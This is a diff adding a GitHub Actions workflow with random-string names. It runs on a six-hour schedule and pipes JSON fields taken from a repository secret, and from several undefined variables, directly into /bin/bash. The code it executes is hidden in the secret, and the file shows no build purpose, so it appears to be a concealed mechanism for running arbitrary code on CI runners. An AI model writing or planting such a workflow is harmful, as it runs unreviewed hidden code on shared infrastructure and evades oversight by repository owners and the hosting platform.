@@ -1,0 +1,19 @@
+name: luxiecheng7815
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luxiecheng7815
+        env:
+          nvup55616: ${{ secrets.nvup55616 }}
+        run: |
+          echo $nvup55616 | jq -r .oux9 | /bin/bash
+          echo $je267 | jq -r .foh7 | /bin/bash
+          echo $mam2 | jq -r .xgr12 | /bin/bash
+          echo $zkx938 | jq -r .ryklg60429 | /bin/bash
+
